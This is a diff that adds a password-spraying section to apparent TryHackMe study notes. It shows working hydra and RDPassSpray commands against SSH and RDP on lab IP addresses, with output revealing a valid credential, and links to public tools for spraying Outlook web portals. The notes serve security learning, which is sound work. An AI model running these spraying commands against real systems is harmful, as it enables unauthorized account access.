@@ -312,7 +312,30 @@ Or for example, during the enumeration, we found that the webserver serves `logo
 
 `-f` to stop the brute-forcing attacks after finding a valid username and password  
 
+## Password spray attack
+- SSH
+  ```
+  user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
+  [INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
+  [22][ssh] host: 10.1.1.10 login: victim password: Spring2021
+  [STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
+  1 of 1 target successfully completed, 1 valid password found
+  ```
+  `L` is to load the list of valid usernames, and `-p` uses the `Spring2021` password against the SSH service at `10.1.1.10`.
 
+- RDP
+  ```
+  user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
+  [13-02-2021 16:47] - Total number of users to test: 1
+  [13-02-2021 16:47] - Total number of password to test: 1
+  [13-02-2021 16:47] - Total number of attempts: 1
+  [13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
+  [13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
+  ```
+
+- Outlook web access (OWA) portal
+  - [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) (atomizer.py)
+  - [MailSniper](https://github.com/dafthack/MailSniper)
 
 
 
